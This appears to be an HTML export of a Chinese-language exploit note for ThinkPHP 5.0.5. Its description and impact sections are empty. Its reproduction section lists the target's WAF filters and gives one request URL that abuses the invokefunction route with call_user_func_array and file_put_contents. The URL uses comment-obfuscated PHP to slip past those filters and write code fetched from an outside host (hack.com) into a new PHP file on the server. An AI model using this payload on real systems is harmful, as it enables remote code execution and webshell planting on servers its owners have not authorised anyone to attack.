@@ -1,0 +1,28 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="thinkphp-505"><span class="csDE05BCC">Thinkphp 5.0.5</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">waf</span><span class="cs9C1B1871">对</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">进行了拦截</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">禁止了</span><span class="cs8926E06">assert</span><span class="cs9C1B1871">函数对</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">函数后面的括号进行了正则过滤</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对</span><span class="cs8926E06">file_get_contents</span><span class="cs9C1B1871">函数后面的括号进行了正则过滤</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=2.php&amp;vars[1][1]=&lt;?php /*1111*//***/file_put_contents/*1**/(/***/&#39;index11.php&#39;/**/,file_get_contents(/**/&#39;https://www.hack.com/xxx.js&#39;))/**/;/**/?&gt;</span></p></body>
+</html>
